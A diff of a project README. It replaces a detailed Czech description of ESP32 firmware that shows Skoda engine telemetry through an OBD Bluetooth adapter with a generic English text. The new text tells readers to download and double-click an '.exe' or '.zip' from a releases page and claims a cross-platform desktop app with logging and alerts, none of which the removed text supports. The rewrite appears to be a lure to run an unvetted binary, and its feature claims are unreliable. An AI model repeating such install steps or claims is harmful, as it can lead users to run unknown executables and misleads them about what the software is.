@@ -1,95 +1,75 @@
-# 🏎️ Monitor telemetrie motoru (OBD II)
+# 🏎️ Skoda-KAROQ-hidden-engine-telemetry - Monitor Your Car’s Engine Data Effortlessly
 
-Monitor pro zobrazování skrytých údajů motoru v reálném čase pomocí ESP32 a OBD II diagnostiky.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/releases)
 
----
+## 🚀 Getting Started
 
-## 🚗 Podporované motory
-Seznam ověřených motorizací, na kterých byl monitor úspěšně testován. Seznam budu postupně doplňovat na základě zpětné vazby.
+Welcome to the Skoda-KAROQ-hidden-engine-telemetry project! This software helps you monitor your car’s engine telemetry for performance insights. With this tool, anyone can gain access to valuable engine information in a user-friendly way.
 
-* **1.5 TSI (110 kW) Evo 2** (kód motoru: `DXD`)
-* *Další budou doplněny...*
+## 📥 Download & Install
 
-> [!TIP]
-> Pokud jste monitor vyzkoušeli na jiném motoru, dejte mi prosím vědět (např. přes Issues), abych mohl seznam rozšířit!
+To get started, follow these steps:
 
----
-<p align="center">
-  <ins><b>🎥 Ukázka systému v praxi</b></ins><br>
-  <a href="https://www.youtube.com/watch?v=KxJALGIXn9g">
-    <img src="https://img.youtube.com/vi/KxJALGIXn9g/maxresdefault.jpg" width="600">
-  </a>
-</p>
+1. **Visit the Releases Page:** Click the link below to go to the release page where you can get the latest version of the software.
+   
+   [Download Latest Release](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/releases)
 
----
+2. **Select Your Version:** Look for the most recent release. You will find the application files listed there.
 
-## 🛠️ Hardware
-Pro zprovoznění systému budete potřebovat následující komponenty:
+3. **Download the Application:** Click on the file that fits your needs. If you see options like `.exe`, `.zip`, or others, pick the one suitable for your operating system.
 
-* **Diagnostika:** [Vgate iCar Pro OBD II Bluetooth](https://www.diags.cz/diagnostiky-pro-android-ios-pc/diagnostika-vgate-icar-pro-obd-ii-s-bluetooth-pro-android--pc/) (nebo jiný kompatibilní ELM327 BT modul).
-* **Mikrokontrolér:** [LilyGO TTGO T-Display ESP32 1.14 TFT](https://www.laskakit.cz/lilygo-ttgo-t-displej-esp32-1-14-tft-wifi-modul/).
+4. **Run the Application:** Once the download is complete, find the downloaded file on your computer. Double-click the file to run the application. Follow the on-screen prompts to set it up.
 
----
+5. **Connect Your Device:** Make sure your car's OBD2 device is connected. The app will read data from it to provide real-time telemetry.
 
-## 💻 Software & Konfigurace
+## 📊 Features
 
-> [!CAUTION]
-> **Důležité upozornění:** Pro správnou funkčnost a připojení k OBD je nutné v Arduino IDE použít konkrétní verze knihoven a desek:
-> - **Board:** `esp32` ver. 2.0.17 (výběr: ESP32 Dev Module)
-> - **Knihovna ELMDuino:** ver. 3.3.0
-> - **Knihovna TFT_eSPI:** ver. 2.5.43
+- **Real-Time Monitoring:** View live data about your engine's performance.
+- **User-Friendly Interface:** Simple design that makes it easy to understand engine statistics.
+- **Data Logging:** Keep records of your engine data over time for analysis.
+- **Alert System:** Get notifications for any unusual engine behavior.
 
-### Výchozí nastavení (`settings.h`)
-V konfiguračním souboru lze upravit tyto parametry:
-- `BT_NAME = "V-LINK";` – Název BT modulu, ke kterému se ESP32 připojuje.
-- `uint8_t BT_MAC[6] = {0x00, 0x1D, 0x43, 0x12, 0x34, 0x56};` – MAC adresa BT modulu, ke kterému se ESP32 připojuje (alternativa).
-- `BACKLIGHT_BRIGHTNESS = BRIGHTNESS_LOW;` – Jas spořiče displeje (25 %).
+## ⚙️ System Requirements
 
----
+To run this software smoothly, ensure that you meet the following requirements:
 
-## 📊 Funkční přehled zobrazovaných dat
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **RAM:** At least 2GB.
+- **Storage:** Minimum 100MB of free space for installation.
+- **Connectivity:** Bluetooth or USB for connecting to your car’s OBD2 device.
 
-Systém monitoruje 5 klíčových parametrů s dynamickým uzpůsobením barev.
+## 📋 Topics Covered
 
-### 1. Teplota motorového oleje (`OLEJ`)
-| Barva | Stav | Význam |
-| :--- | :--- | :--- |
-| 🟦 **Modrá** | Studený motor | Nepoužívat plný výkon |
-| 🟧 **Oranžová** | Zahřívání | Motor se blíží k provozní teplotě |
-| 🟩 **Limetková** | Ideální stav | Motor je plně prohřátý |
-| 🟥 **Červená** | Zvýšená zátěž | Např. dálnice nebo táhlé stoupání |
-| ⬜ **Alarm** | Kritický stav | Červený text na bílém pozadí - doporučeno zvolnit |
+This software integrates well with technologies like:
 
-### 2. Teplota chladicí kapaliny (`KAPALINA`)
-| Barva | Stav |
-| :--- | :--- |
-| 🟦 **Modrá** | Studená voda |
-| 🟧 **Oranžová** | Zahřívání |
-| 🟩 **Zelená** | Provozní teplota |
-| 🟥 **Červená** | Možné přetížení chladicího systému |
+- Arduino
+- ESP32
+- OBD2
+- Skoda cars, specifically the KAROQ model
 
-### 3. Reálná rychlost (`RYCHLOST`)
-Digitální údaj přímo z řídící jednotky (přesnější než tachometr). Implementována **chytrá hystereze 2 km/h** proti problikávání barev.
-- ⬜ **Šedá:** Běžná rychlost.
-- 🟧 **Oranžová (Limity):** Signalizace pro rychlosti:
-  - 54–60 km/h (Limit obec)
-  - 94–100 km/h (Limit mimo obec)
-  - 134–140 km/h (Limit dálnice)
+These integrations help provide a more accurate and enhanced monitoring experience.
 
-### 4. Palubní napětí (`NAPETI`)
-Měřeno na OBD zásuvce. Klíčové pro vozy s **inteligentním dobíjením** (rekuperací).
-- 🟥 **Červená:** Baterie se vybíjí (motor vypnutý/slabý alternátor).
-- 🟩 **Limetková:** Standardní dobíjení za jízdy.
-- 🟨 **Zlatá:** Aktivní rekuperace (brzdění motorem, intenzivní dobíjení).
+## 🛠️ Troubleshooting
 
-### 5. Ujetá vzdálenost (`UJETO`)
-- Zobrazuje celkovou ujetou vzdálenost s přesností na **0.1 km**.
+If you encounter any issues while using the application, consider the following steps:
 
----
+1. **Check Connections:** Ensure your OBD2 device is properly connected.
+2. **Update Drivers:** If the application does not recognize your device, verify that your device drivers are up-to-date.
+3. **Restart the Application:** Close and reopen the app to reset the connection.
 
-## 💡 Chytré funkce systému
+## 💬 Getting Help
 
-* **Hystereze:** Zabraňuje zběsilému přepínání barev při jízdě na hranici limitu (např. stabilní barva při kolísání 53-54 km/h).
-* **Smoothing (Vyhlazování):** Optimalizované čtení dat z OBD sběrnice, které nezatěžuje procesor a nezpůsobuje záseky vykreslování.
-* **Periferní scannability:** Barevné schéma je navrženo tak, aby řidič nemusel číst čísla – stačí vnímat barvu v zorném poli.
+If you need further assistance, feel free to reach out through the issues section of this repository. We are here to help you.
 
+## 📝 Contribution
+
+If you wish to contribute to this project, please make a pull request or open an issue. We welcome any feedback or suggestions to improve the software.
+
+## 🔗 Additional Resources
+
+For more information on how to work with telemetry data, you can explore the following links:
+
+- OBD2 Information: [OBD2 Wiki](https://en.wikipedia.org/wiki/OBD-II_PIDs)
+- Arduino Documentation: [Arduino](https://www.arduino.cc/en/Reference/HomePage)
+
+Thank you for choosing Skoda-KAROQ-hidden-engine-telemetry! Enjoy monitoring your vehicle's performance.
